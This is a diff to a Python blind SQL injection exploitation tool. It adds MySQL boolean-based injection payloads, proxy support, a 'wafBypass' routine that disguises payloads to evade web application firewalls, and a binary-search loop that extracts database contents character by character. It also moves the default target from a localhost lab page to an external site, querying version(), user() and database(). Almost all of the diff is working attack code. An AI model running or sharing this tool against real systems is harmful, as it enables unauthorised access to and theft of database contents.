@@ -18,11 +18,12 @@ except:
 
 class HTTP():
     ''' HTTP class '''
+
     verbosity = False
     url = None
     parameters = None
     timeout = 5
-    method = 'POST'
+    method = 'GET'
     headers = {
         'User-Agent': 'Mozilla/5.0'
     }
@@ -38,16 +39,26 @@ class HTTP():
         self.session.headers = self.headers
 
     def get(self, payload):
-        return self.session.get(self.url, params = payload, headers = self.headers, timeout = self.timeout, verify = False, allow_redirects = False)
+        return self.session.get(self.url, params = payload, headers = self.headers, timeout = self.timeout, verify = False, allow_redirects = False, proxies = self.proxies)
 
     def post(self, payload):
         return self.session.post(self.url, data = payload, headers = self.headers, timeout = self.timeout, verify = False, allow_redirects = False, proxies = self.proxies)
 
+    def request(self, payload):
+        if self.method == 'POST':
+            return self.post(payload)
+        return self.get(payload)
 
 class Injector():
     ''' Injector Class '''
+
+    '''
+    Change payloads if required. Some example payloads are given below
     payload = "1'and if(substring(%s,%i,1)between(0x%x)and(0x%x),1,(select table_name from information_schema.tables))and''='"
     payload_length = "1'and if(length(%s)between(%i)and(%i),1,(select table_name from information_schema.tables))and''='"
+    '''
+    payload = "1')or if(BINARY substring((%s),%i,1)between(0x%x)and(0x%x),1,0)#"
+    payload_length = "1')or if(length((%s))between(%i)and(%i),1,0)#"
     verbosity = False
     injectible = None
     http = None
@@ -55,67 +66,66 @@ class Injector():
     def __init__(self, url, parameters):
         self.http = HTTP(url, parameters)
         self.setInjectible()
-        self.reset()
-
-    def reset(self):
-        self.start = 0
-        self.end = 255
 
     def setInjectible(self):
         self.injectible = {v : k for k, v in self.http.parameters.items()}['__PAYLOAD__']
 
-    def makePayload(self, position, start, pointer, length = False):
+    def wafBypass(self, payload):
+        '''
+        This is the final payload which gets injected
+        You can replace keywords or modify the payload with search/replace to bypass some WAF
+        For example, I'm replacing all spaces in the final payload with /**/
+        '''
+        return payload.replace(' ', '/**/')
+
+    def makePayload(self, position, start, pointer, lengthOnly = False):
         payload = self.http.parameters
-        if not length:
-            payload[self.injectible] = self.payload % (self.query, position, start, pointer)
+        if lengthOnly:
+            payload[self.injectible] = self.wafBypass(self.payload_length % (self.query, start, pointer))
         else:
-            payload[self.injectible] = self.payload_length % (self.query, start, pointer)
+            payload[self.injectible] = self.wafBypass(self.payload % (self.query, position, start, pointer))
         return payload
 
-    def characterAt(self, output, position):
+    def infer(self, response):
+        '''
+        This method infers True/False results
+        You can use the response object to define your own True/False checks
+        '''
+        if len(response.content) < 50:
+            return False
+        return True
+
+    def characterAt(self, output = None, position = None, lengthOnly = None):
         start = 0
         end = 255
+        if lengthOnly:
+            end = 2000
         pointer = 0
         while not (start == end == pointer):
             pointer = start + int((end - start) / 2)
             if (start == end == pointer):
+                if lengthOnly:
+                    return pointer
                 output[position] = chr(pointer)
-                self.print(output)
-                return
-            r = self.http.post(self.makePayload(position, start, pointer))
-            # Change this block to handle any true / false case
-            if len(r.text) < 45000:
-                # False
-                start = pointer + 1
-            else:
-                # True
+                return self.print(output)
+            r = self.http.request(self.makePayload(position, start, pointer, lengthOnly))
+            if self.infer(r):
                 end = pointer
+            else:
+                start = pointer + 1
+        if lengthOnly:
+            return pointer
         output[position] = chr(pointer)
-        self.print(output)
-        return
+        return self.print(output)
+
+    def length(self):
+        return self.characterAt(None, 0, True)
 
     def print(self, output):
         sys.stdout.flush()
         print("\r", end = '')
         print(''.join(dict(sorted(output.items())).values()), end = '')
         sys.stdout.flush()
-
-    def length(self):
-        start = 0
-        end = 2000
-        pointer = 0
-        while not (start == end == pointer):
-            pointer = start + int((end - start) / 2)
-            if (start == end == pointer):
-                return pointer
-            r = self.http.post(self.makePayload(0, start, pointer, True))
-            if len(r.text) < 45000:
-                # False
-                start = pointer + 1
-            else:
-                # True
-                end = pointer
-        return pointer
 
     def inject(self, query):
         self.query = query
@@ -131,10 +141,10 @@ class Injector():
             return
 
 def main():
-    url = 'http://127.0.0.1/sqli.php'
+    url = 'http://somesite.com/index_public.php'
     parameters = {
-        'id' : '__PAYLOAD__',
-        'other' : 'other'        
+        'q' : '__PAYLOAD__',
+        'other' : 'parameters'
     }
     injector = Injector(url, parameters)
     queries = ['version()', 'user()', 'database()']
